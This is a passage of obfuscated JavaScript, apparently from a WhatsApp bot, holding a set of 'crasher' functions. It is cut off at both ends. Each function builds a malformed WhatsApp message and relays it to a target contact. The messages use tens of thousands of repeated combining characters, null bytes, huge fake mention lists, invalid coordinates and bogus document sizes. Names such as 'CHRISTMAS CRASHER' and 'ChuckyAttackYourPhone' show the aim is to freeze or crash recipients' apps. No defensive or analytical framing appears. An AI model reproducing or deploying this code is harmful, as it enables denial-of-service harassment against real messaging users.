            dataSharingContext: {
              showMmDisclosure: true
            }
          }
        }
      }, _0x483a0f ? {
        participant: {
          jid: _0x432c57
        }
      } : {});
    }
    async function _0x1d0fb0(_0x18ed8e, _0x49582d = false) {
      await _0x4b53e5.relayMessage(_0x18ed8e, {
        extendedTextMessage: {
          text: "⩟⬦𪲁 ��-�� -\0\0\0" + "@0".repeat(90000),
          contextInfo: {
            mentionedJid: ["0@s.whatsapp.net", ...Array.from({
              length: 15000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
            stanzaId: "1234567890ABCDEF",
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              callLogMesssage: {
                isVideo: true,
                callOutcome: "1",
                durationSecs: "0",
                callType: "REGULAR",
                participants: [{
                  jid: "0@s.whatsapp.net",
                  callOutcome: "1"
                }]
              }
            },
            remoteJid: _0x18ed8e,
            conversionSource: " target ",
            conversionData: "",
            conversionDelaySeconds: 10,
            forwardingScore: 9999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " target ",
              mediaType: "IMAGE",
              jpegThumbnail: "https://d.top4top.io/p_32640ogxp0.jpg",
              caption: " target "
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            },
            expiration: 86400,
            ephemeralSettingTimestamp: "1728090592378",
            ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
            externalAdReply: {
              title: "\0",
              body: "\0",
              mediaType: "VIDEO",
              renderLargerThumbnail: true,
              previewType: "VIDEO",
              thumbnail: "https://d.top4top.io/p_32640ogxp0.jpg",
              sourceType: " target ",
              sourceId: " target ",
              sourceUrl: "https://www.facebook.com/WhatsApp",
              mediaUrl: "https://www.facebook.com/WhatsApp",
              containsAutoReply: true,
              showAdAttribution: true,
              ctwaClid: "ctwa_clid_example",
              ref: "ref_example"
            },
            entryPointConversionSource: "entry_point_source_example",
            entryPointConversionApp: "entry_point_app_example",
            entryPointConversionDelaySeconds: 5,
            disappearingMode: {},
            actionLink: {
              url: "https://www.facebook.com/WhatsApp"
            },
            groupSubject: " target ",
            parentGroupJid: "120363321780343299-0@g.us",
            trustBannerType: " target ",
            trustBannerAction: 1,
            isSampled: true,
            utm: {
              utmSource: " target ",
              utmCampaign: " target "
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363321780343299-0@g.us",
              serverMessageId: 1,
              newsletterName: " target ",
              contentType: "UPDATE",
              accessibilityText: " target "
            },
            businessMessageForwardInfo: {
              businessOwnerJid: "0@s.whatsapp.net"
            },
            smbClientCampaignId: "smb_client_campaign_id_example",
            smbServerCampaignId: "smb_server_campaign_id_example",
            dataSharingContext: {
              showMmDisclosure: true
            }
          }
        }
      }, _0x49582d ? {
        participant: {
          jid: _0x18ed8e
        }
      } : {});
    }
    async function _0x2ee745(_0x2f0c11, _0x2bee24, _0x31583f = true) {
      let _0x4b68fc = "⿻ᬃ𝐂𝐇𝐑𝐈𝐒𝐓𝐌𝐀𝐒 𝐂𝐑𝐀𝐒𝐇𝐄𝐑⃟⿻";
      let _0x5d8a67 = generateWAMessageFromContent(_0x2f0c11, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "⩟⬦𪲁 ��-�� -\0\0\0" + "ꦾ".repeat(50000),
                locationMessage: {},
                hasMediaAttachment: true
              },
              body: {
                text: "\0" + "ꦾ".repeat(90000)
              },
              nativeFlowMessage: {
                name: "call_permission_request",
                messageParamsJson: "Chucky Christmas Crasher 👋😼"
              },
              carouselMessage: {}
            }
          }
        }
      }), {
        userJid: _0x2f0c11,
        quoted: _0x2bee24
      });
      await _0x4b53e5.relayMessage(_0x2f0c11, _0x5d8a67.message, _0x31583f ? {
        participant: {
          jid: _0x2f0c11
        }
      } : {});
    }
    async function _0x2bd409(_0x62a961) {
      const _0x5d49ea = {
        degreesLatitude: -999.035,
        degreesLongitude: 999.035
      };
      const _0x2904a1 = {
        locationMessage: _0x5d49ea,
        hasMediaAttachment: false
      };
      const _0x3357e0 = {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: _0x2904a1,
              body: {
                text: "ꦾ".repeat(90000)
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "review_and_pay",
                  buttonParamsJson: JSON.stringify({
                    currency: "IDR",
                    total_amount: {
                      value: 6100,
                      offset: 100
                    },
                    reference_id: "4Q79X9PCBEM",
                    type: "physical-goods",
                    order: {
                      status: "completed",
                      subtotal: {
                        value: 0,
                        offset: 100
                      },
                      order_type: "PAYMENT_REQUEST",
                      items: [{
                        retailer_id: "custom-item-7fca9870-8e3a-4a4a-bfb7-8a07fbf5fa9e",
                        name: "@1".repeat(50000),
                        amount: {
                          value: 6100,
                          offset: 100
                        },
                        quantity: 1
                      }]
                    },
                    additional_note: "𝐊𝐈𝐋𝐋𝚵𝐑𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕",
                    native_payment_methods: [],
                    share_payment_status: false
                  })
                }]
              },
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "𝐊𝐈𝐋𝐋𝚵𝐑𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
                }],
                isForwarded: true,
                quotedMessage: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{\n                \"screen_2_OptIn_0\": true,\n                \"screen_2_OptIn_1\": true,\n                \"screen_1_Dropdown_0\": \"TAMAENABLECRASH\",\n                \"screen_1_DatePicker_1\": \"1028995200000\",\n                \"screen_1_TextInput_2\": \"client@gmail.com\",\n                \"screen_1_TextInput_3\": \"94643116\",\n                \"screen_0_TextInput_0\": \"radio - buttons" + "ꦾ".repeat(300000) + "\",\n                \"screen_0_TextInput_1\": \"Why?\",\n                \"screen_0_Dropdown_2\": \"001-Grimgar\",\n                \"screen_0_RadioButtonsGroup_3\": \"0_true\",\n                \"flow_token\": \"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"\n                                    }",
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      };
      _0x4b53e5.relayMessage(_0x62a961, _0x3357e0, {
        participant: {
          jid: _0x62a961
        }
      }, {
        messageId: null
      });
    }
    async function _0x47ee2c(_0x14a2ef, _0x5d9d6a) {
      var _0x2de00b = await generateWAMessageFromContent(_0x14a2ef, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "please replyz( my message bro\n",
                locationMessage: {
                  degreesLatitude: -999.035,
                  degreesLongitude: 999.035,
                  jpegThumbnail: {
                    url: "https://files.catbox.moe/1h6mh7.jpg"
                  }
                },
                hasMediaAttachment: true
              },
              body: {
                text: "\0" + "ꦾ".repeat(90000)
              },
              nativeFlowMessage: {
                messageParamsJson: "\0".repeat(55000)
              },
              carouselMessage: {}
            }
          }
        }
      }), {
        userJid: _0x14a2ef,
        quoted: _0x5d9d6a
      });
      await _0x4b53e5.relayMessage(_0x14a2ef, _0x2de00b.message, {
        messageId: _0x2de00b.key.id
      });
    }
    async function _0xc02c5b(_0x2ed15f) {
      let _0xb16a5b = "⿻ᬃ𝐂𝐇𝐑𝐈𝐒𝐓𝐌𝐀𝐒 𝐂𝐑𝐀𝐒𝐇𝐄𝐑⃟⿻";
      let _0x222df1 = Date.now();
      const _0x57b342 = {
        degreesLatitude: -999.035,
        degreesLongitude: 999.035
      };
      const _0x4b4f49 = {
        locationMessage: _0x57b342,
        hasMediaAttachment: true
      };
      await _0x4b53e5.relayMessage(_0x2ed15f, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: _0x4b4f49,
              body: {
                text: "⩟⬦𪲁 ��-�� -\0\0\0" + "ꦾ".repeat(55000) + "@1".repeat(90000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "TAMAEXECUTE"
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: _0x2ed15f
        }
      });
    }
    async function _0x391ba7(_0x3a4c1b, _0x1378b3) {
      let _0x4e51da = "⩟⬦𪲁 ��-�� -\0\0\0";
      const _0x131376 = {
        degreesLatitude: -999.035,
        degreesLongitude: 999.035
      };
      const _0x37eb99 = {
        locationMessage: _0x131376,
        hasMediaAttachment: true
      };
      _0x4b53e5.relayMessage(_0x3a4c1b, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: _0x37eb99,
              body: {
                text: "⩟⬦𪲁 ��-�� -\n̈́ͯͯͯͯ" + "ꦾ".repeat(50000) + "@1".repeat(90000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 50
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "⩟⬦𪲁 ��-�� -\0\0\0"
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: _0x3a4c1b,
          quoted: _0x1378b3
        }
      }, {
        messageId: null
      });
    }
    async function _0x4e84cb(_0x562aab) {
      await _0x4b53e5.relayMessage(_0x562aab, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0
                },
                hasMediaAttachment: true
              },
              body: {
                text: "⩟⬦𪲁 ��-�� -\0\0\0" + "ꦾ".repeat(90000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: " ⩟⬦𪲁 ��-�� - "
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: _0x562aab
        }
      }, {
        messageId: null
      });
    }
    async function _0x317d69(_0x16c561) {
      let _0x1ba273 = "📄𝗗𝗼𝗰𝘂𝗺𝗲𝗻𝘁𝗦𝘆𝘀𝘁𝗲𝗺☠️";
      const _0x206b70 = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
        fileLength: "999999999",
        pageCount: 9999999999999,
        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
        fileName: _0x1ba273,
        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
        directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1715880173",
        contactVcard: true
      };
      const _0x93896e = {
        documentMessage: _0x206b70,
        hasMediaAttachment: true
      };
      _0x4b53e5.relayMessage(_0x16c561, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: _0x93896e,
              body: {
                text: "⿻ᬃ𝐂𝐇𝐑𝐈𝐒𝐓𝐌𝐀𝐒 𝐂𝐑𝐀𝐒𝐇𝐄𝐑⃟⿻\n" + "ꦾ࣯".repeat(50000) + "@1".repeat(1030000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "𝐊𝐈𝐋𝐋𝚵𝐑𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: _0x16c561
        }
      });
    }
    async function _0x2ae636(_0x394bbb) {
      let _0x37f13f = "📄𝗗𝗮𝗿𝗸𝗗𝗼𝗰𝘂𝗺𝗲𝗻𝘁";
      const _0x427b5e = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
        fileLength: "999999999",
        pageCount: 9999999999999,
        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
        fileName: _0x37f13f,
        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
        directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1715880173",
        contactVcard: true
      };
      const _0x1361fd = {
        documentMessage: _0x427b5e,
        hasMediaAttachment: true
      };
      _0x4b53e5.relayMessage(_0x394bbb, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: _0x1361fd,
              body: {
                text: "⩟⬦𪲁 ��-�� -\0\0\0" + "𑌿𑌀࣯".repeat(50000) + "@1".repeat(90000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "𝐊𝐈𝐋𝐋𝚵𝐑𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: _0x394bbb
        }
      });
    }
    async function _0x2e3112(_0x7d013) {
      let _0x5d4847 = "📄𝗙𝗿𝗲𝗲𝘇𝗲𝗗𝗼𝗰𝘂𝗺𝗲𝗻𝘁";
      const _0x33c916 = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
        fileLength: "999999999",
        pageCount: 9999999999999,
        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
        fileName: _0x5d4847,
        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
        directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1715880173",
        contactVcard: true
      };
      const _0x5d43d7 = {
        documentMessage: _0x33c916,
        hasMediaAttachment: true
      };
      _0x4b53e5.relayMessage(_0x7d013, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: _0x5d43d7,
              body: {
                text: "🥶Ƚαɱα🥶Ƈσσʅ🥶" + "ꦾ".repeat(50000) + "@1".repeat(90000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "𝐊𝐈𝐋𝐋𝚵𝐑𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: _0x7d013
        }
      });
    }
    async function _0x3941b8(_0x5eacb6) {
      let _0x339ad4 = "📄𝗗𝗼𝗰𝘂𝗺𝗲𝗻𝘁𝗧𝗿𝗮𝘀𝗵";
      const _0x19f787 = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
        fileLength: "999999999",
        pageCount: 9999999999999,
        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
        fileName: _0x339ad4,
        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
        directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1715880173",
        contactVcard: true
      };
      const _0x3903d0 = {
        documentMessage: _0x19f787,
        hasMediaAttachment: true
      };
      _0x4b53e5.relayMessage(_0x5eacb6, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: _0x3903d0,
              body: {
                text: "#тяαѕн ∂σ¢υмєηт​" + "ꦾ࣯".repeat(50000) + "@1".repeat(90000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "𝐊𝐈𝐋𝐋𝚵𝐑𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: _0x5eacb6
        }
      });
    }
    async function _0x27dc9a(_0x446bb9) {
      let _0x27fa94 = "📄𝗗𝗼𝗰𝘂𝗺𝗲𝗻𝘁~𝗟𝗼𝘃𝗲";
      const _0x1437c3 = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
        fileLength: "999999999",
        pageCount: 9999999999999,
        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
        fileName: _0x27fa94,
        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
        directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1715880173",
        contactVcard: true
      };
      const _0x451f83 = {
        documentMessage: _0x1437c3,
        hasMediaAttachment: true
      };
      _0x4b53e5.relayMessage(_0x446bb9, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: _0x451f83,
              body: {
                text: "𝘐 𝘓𝘰𝘷𝘦 𝘠𝘰𝘶 ~> 𝘛𝘢𝘮𝘢 𝘙𝘺𝘶𝘪𝘤𝘩𝘪" + "ꦾ".repeat(50000) + "@1".repeat(90000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "𝐊𝐈𝐋𝐋𝚵𝐑𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: _0x446bb9
        }
      });
    }
    async function _0x66a09e(_0x228ed2, _0x4cfa9f) {
      var _0x15c023 = generateWAMessageFromContent(_0x228ed2, proto.Message.fromObject({
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/29984231_944880251026741_669740733267367642_n.enc?ccb=11-4&oh=01_Q5AaIGSoVLTX6oUIyksFHKc4aOP2g-pyeXH6fhgRasx1Dnx9&oe=675AC1F5&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          fileSha256: "lYXifE5EEbJ9YAR2lRdmpVTeTXQ2xIW15B8zKXGOL8A=",
          fileLength: "3722921",
          seconds: 99999,
          mediaKey: "IoxI2qKxHpqlKwtPwaP90rjAdUNY/zdqHi8unAf+cyA=",
          caption: "⿻ᬃ𝐂𝐇𝐑𝐈𝐒𝐓𝐌𝐀𝐒 𝐂𝐑𝐀𝐒𝐇𝐄𝐑⃟⿻" + "ꦾ".repeat(90000),
          height: 99999,
          width: 99999,
          fileEncSha256: "PmVjaFaRk6F+rSAfMNY1/i9YxS4AGqhkZ1/8j+c4ZUk=",
          directPath: "/v/t62.7161-24/29984231_944880251026741_669740733267367642_n.enc?ccb=11-4&oh=01_Q5AaIGSoVLTX6oUIyksFHKc4aOP2g-pyeXH6fhgRasx1Dnx9&oe=675AC1F5&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1731409391",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKQMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAmQAAAAAAAAAAAAAAf//EABQQAQAAAAAAAAAAAAAAAAAAAFD/2gAIAQEAAT8AW//EABQRAQAAAAAAAAAAAAAAAAAAADD/2gAIAQIBAT8Af//EABQRAQAAAAAAAAAAAAAAAAAAADD/2gAIAQMBAT8Af//Z",
          viewOnce: true
        }
      }), {
        userJid: _0x228ed2,
        quoted: _0x4cfa9f
      });
      await _0x4b53e5.relayMessage(_0x228ed2, _0x15c023.message, {
        participant: {
          jid: _0x228ed2
        },
        messageId: _0x15c023.key.id
      });
    }
    async function _0x56ff86(_0x28cc7b, _0x376e30) {
      var _0x562e94 = generateWAMessageFromContent(_0x28cc7b, proto.Message.fromObject({
        imageMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m269/up-oil-image-2ad295cb-cd76-4eec-9c7c-616d96e68084?ccb=9-4&oh=01_Q5AaIONA3IgGXz_RrkjaVfEj4l05WzeSH95pPKm0rfjbidwK&oe=675AAC11&_nc_sid=e6ed6c&mms3=true",
          mimetype: "image/jpeg",
          caption: "⿻ᬃ𝐂𝐇𝐑𝐈𝐒𝐓𝐌𝐀𝐒 𝐂𝐑𝐀𝐒𝐇𝐄𝐑⃟⿻" + "ꦾ".repeat(90000),
          fileSha256: "JX8MoHiwJy5tRWf1r26p/NIwuVG4KGl1m87BpbvmJDI=",
          fileLength: "14809900",
          height: 9000,
          width: 9000,
          mediaKey: "0mFZtEM/twP8s8sK86VgURT92yR8mJiUV/gbP99sRag=",
          fileEncSha256: "AjyQqEB0C+0bsn3XCteVFOIE4zW1k3BPQMCTa/ystX0=",
          directPath: "/o1/v/t62.7118-24/f1/m269/up-oil-image-2ad295cb-cd76-4eec-9c7c-616d96e68084?ccb=9-4&oh=01_Q5AaIONA3IgGXz_RrkjaVfEj4l05WzeSH95pPKm0rfjbidwK&oe=675AAC11&_nc_sid=e6ed6c",
          mediaKeyTimestamp: "1731409472",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAuAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQEBAQAAAAAAAAAAAAAAAAABAAL/2gAMAwEAAhADEAAAAPPNlfqp2kYTnX3UOalrTAlBqC56Ff0W2XP21DJOlzLFIgAppS6oFa8zZjVeHZSyzu+TheMSH66UzeaZXUaHOMchGe8RHYKJiFaFgSyiGNZJhvDUA1//xAAoEAACAgICAQIFBQAAAAAAAAABAgADESEEEkETMQUUQlJxIiMzUYH/2gAIAQEAAT8AOZ8NqS3KWU5iItYCqABNHcvcnKhsQ6loLKQIa50iguQAJwK7Upw5EHbJzCdES1yzQmH2hwXK7M9B/wCotagjxOEUSvqH7NLbOiE5jXZCsJyWXIYeYtgbUdiBqEuG7AQ2uxz2InyyxP2QceYWa0Mm9w8N0XIaWoxOGEZAux4jucz/AGYjXRnzOLdYj42REYFZyGIsYtLCcnEzskzM7T5agaK6lvD4/uDiLXVVQxXzKrXoRWIyhnJurcjpkwbbY8Q1Ix2sFaD6ROifaJb+pDgwg4HZo9u2XOoh7VMufMuRq23AWGy3mC1fUydan27mZRf9LR1QOT4xmJR2GfBGZWQj4I1DWjbO5ZQC+FjrvBGxKkNjhRE4dIUZGTATmXE+gplP8S/iWaslRJrEsJAT8zlgabzOF7O3mUEmpSZ//8QAGxEAAgEFAAAAAAAAAAAAAAAAARAAESAwMUH/2gAIAQIBAT8AQwmCwwKrG5xf/8QAHREAAgEEAwAAAAAAAAAAAAAAAAEQAhEgMRJBUf/aAAgBAwEBPwCHjY0XLMpHghqOMeD0dx//2Q==",
          scansSidecar: "4jxGo/gXnBXFf4ir0LYYqZAm0z3ICvlxJB4bs8CdkXxE76K2Yo/lrg==",
          scanLengths: [12861, 50160, 30574, 54495],
          midQualityFileSha256: "kl6RwwWKmL4QmzIBvxY7rzKtna6LUbPyytmrbyYO1SU=",
          viewOnce: true
        }
      }), {
        userJid: _0x28cc7b,
        quoted: _0x376e30
      });
      await _0x4b53e5.relayMessage(_0x28cc7b, _0x562e94.message, {
        participant: {
          jid: _0x28cc7b
        },
        messageId: _0x562e94.key.id
      });
    }
    async function _0x162c2c(_0x3d3636) {
      try {
        let _0x53d92c = generateWAMessageFromContent(_0x3d3636, proto.Message.fromObject({
          pollCreationMessageV3: {
            name: "⿻ᬃ𝐂𝐇𝐑𝐈𝐒𝐓𝐌𝐀𝐒 𝐂𝐑𝐀𝐒𝐇𝐄𝐑⃟⿻" + "ꦾိိိ့".repeat(1000),
            options: [{
              optionName: "#ChuckyExecutor~"
            }, {
              optionName: "#CrashExtreme~"
            }, {
              optionName: "#I Love You.."
            }, {
              optionName: "#But... You Loser"
            }, {
              optionName: "#ChuckyCrasher~!"
            }, {
              optionName: "#ChuckyAttackYourPhone~!"
            }],
            selectableOptionsCount: 6
          }
        }), {
          userJid: _0x3d3636
        });
        await _0x4b53e5.relayMessage(_0x3d3636, _0x53d92c.message, {
          messageId: _0x53d92c.key.id
        });
        console.log(_0x3e6b4d.green("Polling sent successfully"));
      } catch (_0x1ba58b) {
        console.error("Error sending message:", _0x1ba58b);
      }
    }
    async function _0x58cb40(_0x393231) {
      let _0x49bf40 = "⿻ᬃ𝐂𝐇𝐑𝐈𝐒𝐓𝐌𝐀𝐒 𝐂𝐑𝐀𝐒𝐇𝐄𝐑⃟⿻" + "ꦾ".repeat(50000);
      let _0x5543b0 = Array.from({
        length: 35000
      }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");
      var _0x14e814 = generateWAMessageFromContent(_0x393231, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            newsletterAdminInviteMessage: {
              newsletterJid: "120363321780343299@newsletter",
              newsletterName: _0x49bf40,
              jpegThumbnail: "",
              caption: _0x49bf40,
              inviteExpiration: Date.now() + 1814400000
            },
            contextInfo: {
              mentionedJid: _0x5543b0,
              groupMentions: [{
                groupJid: "120363321780343299@newsletter",
                groupSubject: _0x49bf40
              }]
            }
          }
        }
      }), {
        userJid: _0x393231
      });
      await _0x4b53e5.relayMessage(_0x393231, _0x14e814.message, {
        participant: {
          jid: _0x393231
        },
        messageId: _0x14e814.key.id
      });
    }
    async function _0x2d99f9(_0x40ee59) {
      let _0x3e86b6 = Array.from({
        length: 35000
      }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");
      var _0x2b182c = generateWAMessageFromContent(_0x40ee59, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            newsletterAdminInviteMessage: {
              newsletterJid: "120363321780343299@newsletter",
              newsletterName: "\0" + "ꦾ".repeat(90000),
              jpegThumbnail: "",
              caption: "\0" + "ꦾ".repeat(90000),
              inviteExpiration: Date.now()
            },
            contextInfo: {
              mentionedJid: _0x3e86b6,
              groupMentions: [{
                groupJid: "120363321780343299@newsletter",
                groupSubject: "T-RYUICHI><"
              }]
            }
          }
        }
      }), {
        userJid: _0x40ee59
      });
      await _0x4b53e5.relayMessage(_0x40ee59, _0x2b182c.message, {
        participant: {
          jid: _0x40ee59
        },
        messageId: _0x2b182c.key.id
      });
    }
    async function _0xe3bdc(_0x326425, _0x2e5f1d = false) {
      await _0x4b53e5.relayMessage(_0x326425, {
        extendedTextMessage: {
          text: "EXECUTE BY RYUICHI" + "".repeat(90000),
          contextInfo: {
